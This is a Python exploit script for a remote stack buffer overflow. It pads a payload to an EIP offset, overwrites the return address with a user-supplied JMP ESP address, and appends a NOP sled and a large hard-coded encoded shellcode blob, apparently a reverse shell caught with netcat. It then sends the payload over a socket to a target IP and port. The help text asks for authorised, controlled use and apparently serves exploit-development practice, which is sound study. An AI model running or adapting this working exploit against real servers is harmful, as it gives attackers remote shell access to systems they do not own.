#!/usr/bin/env python3

import sys
import subprocess
import socket
import argparse
import itertools
import struct
from typing import Optional

def main(ip: str, port: int, eip_offset: int, overflow_threshold: int, jmp_address: hex) -> None:
	if eip_offset > overflow_threshold:
		print("The value of the offset cannot be bigger than the overflow threshold")
		sys.exit(0)
	
	# Define prefix and buffer with encoded cyclic pattern
	prefix = b""	# CHANGE
	buffer = b"A" * eip_offset
	eip = struct.pack('<I', jmp_address) # Transforms 0x625011AF into \xAF\x11\x50\x62
	shellcode =  b""
	shellcode += b"\xbb\xcc\x19\x13\xbf\xdb\xc8\xd9\x74\x24\xf4"
	shellcode += b"\x5d\x2b\xc9\xb1\x5e\x31\x5d\x15\x83\xc5\x04"
	shellcode += b"\x03\x5d\x11\xe2\x39\xe5\xfb\x30\xc1\x16\xfc"
	shellcode += b"\x2e\xf0\xc4\x98\x25\xa0\xd8\xe9\xdf\xcf\x4b"
	shellcode += b"\xe6\x94\x9d\x7f\xf9\x1d\x6b\xa6\x34\x9d\xe0"
	shellcode += b"\xd4\x1e\x50\x36\xb4\x63\xf3\xca\xc7\xb7\xd3"
	shellcode += b"\xf3\x07\xca\x12\x34\xde\xa0\xfb\xe8\xb6\xc1"
	shellcode += b"\x56\x1c\xb2\x94\x6a\x1d\x14\x93\xd3\x65\x11"
	shellcode += b"\x64\xa7\xd9\x18\xb5\xc3\xa9\x02\xbe\x8c\x09"
	shellcode += b"\x63\xc1\xff\xcc\x4a\xb5\xc3\xff\xb3\x7f\xb7"
	shellcode += b"\xcb\xc0\x81\x11\x02\x17\x2d\x5c\xab\x9a\x2f"
	shellcode += b"\x98\x0b\x45\x5a\xd2\x68\xf8\x5d\x21\x13\x26"
	shellcode += b"\xeb\xb6\xb3\xad\x4b\x13\x42\x61\x0d\xd0\x48"
	shellcode += b"\xce\x59\xbe\x4c\xd1\x8e\xb4\x68\x5a\x31\x1b"
	shellcode += b"\xf9\x18\x16\xbf\xa2\xfb\x37\xe6\x0e\xad\x48"
	shellcode += b"\xf8\xf6\x12\xed\x72\x14\x44\x91\x7a\xe7\x69"
	shellcode += b"\xcf\xec\x24\xa4\xf0\xec\x22\xbf\x83\xde\xed"
	shellcode += b"\x6b\x0c\x53\x66\xb2\xcb\xe2\x60\x45\x03\x4c"
	shellcode += b"\xe0\xbb\xa4\xad\x29\x78\xf0\xfd\x41\xa9\x79"
	shellcode += b"\x96\x91\x56\xac\x03\x9b\xc0\x45\xdf\x8d\x8d"
	shellcode += b"\x32\xdd\xb1\xbc\x9e\x68\x57\xee\x4e\x3b\xc7"
	shellcode += b"\x4f\x3f\xfb\xb7\x27\x55\xf4\xe8\x58\x56\xde"
	shellcode += b"\x81\xf3\xb9\xb7\xfa\x6b\x23\x92\x70\x0d\xac"
	shellcode += b"\x08\xfd\x0d\x26\xb9\x02\xc3\xcf\xc8\x10\x34"
	shellcode += b"\xa8\x32\xe8\xc5\x5d\x33\x82\xc1\xf7\x64\x3a"
	shellcode += b"\xc8\x2e\x42\xe5\x33\x05\xd0\xe1\xcc\xd8\xe1"
	shellcode += b"\x9a\xfb\x4e\x4e\xf4\x03\x9f\x4e\x04\x52\xf5"
	shellcode += b"\x4e\x6c\x02\xad\x1c\x89\x4d\x78\x31\x02\xd8"
	shellcode += b"\x83\x60\xf7\x4b\xec\x8e\x2e\xbb\xb3\x71\x05"
	shellcode += b"\xbf\xb4\x8e\xd8\xe8\x1c\xe7\x22\xa9\x9c\xf7"
	shellcode += b"\x48\x29\xcd\x9f\x87\x06\xe2\x6f\x68\x8d\xab"
	shellcode += b"\xe7\xe3\x40\x19\x99\xf4\x48\xff\x07\xf5\x7f"
	shellcode += b"\x24\xb7\x8c\xf0\xdb\x38\x71\x19\xb8\x38\x72"
	shellcode += b"\x25\xbe\x05\xa5\x1c\xb4\x48\x76\x1b\xd7\x56"
	shellcode += b"\x52\x56\x70\xcf\x37\xdb\x1d\xf0\xe2\x18\x18"
	shellcode += b"\x73\x06\xe1\xdf\x6b\x63\xe4\xa4\x2b\x98\x94"
	shellcode += b"\xb5\xd9\x9e\x0b\xb5\xcb"
	nops = b"\x90" * 16 

	payload = b""
	payload_size = eip_offset + len(eip) + len(shellcode) + len(nops)

	if payload_size > overflow_threshold:
		print("The Overflow Threshold is too small, it should have a minimum value of:", eip_offset + len(eip) + len(shellcode) + len(nops))
		sys.exit(0)

	suffix = b"C" * (overflow_threshold - payload_size)

	timeout = 5
	try:
		# Create socket object
		with socket.socket() as s:
			# Connect to target server
			s.connect((ip, port))

			# Set Timeout
			s.settimeout(timeout)

			# Print server banner
			try:
				while True:
					response = s.recv(4096)
					print(f"{response.decode()}")
			except:
				pass

			# Send data to the server
			payload = b"".join(
				[
					prefix,
					buffer,
					eip,
					nops,
					shellcode,
					suffix,
					b'\n'
				]
			)
			print(f"Sending payload...")
			s.send(payload)

			response = s.recv(4096)
			# Print the response from the server
			print(f"Response: {response.decode()}")

	except ConnectionError:
		print('Connection Refused')
		sys.exit(0)
	except:
		print("\n","="*25,"CRASH","="*25,"\n")
		print(payload)
		print(f"Application crashed at {len(payload) - len(prefix)} bytes!")
		sys.exit(0)

if __name__ == "__main__":
	# Parse command line arguments
	parser = argparse.ArgumentParser(
		prog="Nop Sleds",
		description="""This is a Python script for executing a buffer overflow on a target service of a remote server. 
	The script takes five arguments: an IP address, a port number, the EIP offset, an overflow threshold and the address of the JUMP ESP intruction which does not have correct protection applied. 
	After launching a local netcat listener to the port described in the payload we should be able to get a shell on the target server.
	It is intended for use in a controlled testing environment and should not be used to target production systems or networks without proper authorization.""",
		epilog="Have fun experimenting with this tool!"
	)
	parser.add_argument("ip", help="IP address of the target")
	parser.add_argument("port", type=int, help="Port number of the target")
	parser.add_argument("offset", help="Number of bytes inside the buffer until reaching the return address")
	parser.add_argument("overflow_threshold", help="Payload size which is able to crash the target application")
	parser.add_argument("jmp_esp", help="Address of the JMP ESP instruction we uncovered with Mona (ex: 0x625011AF)")
	args = parser.parse_args()

	# Call main function
	main(args.ip, args.port, int(args.offset), int(args.overflow_threshold), int(args.jmp_esp,16))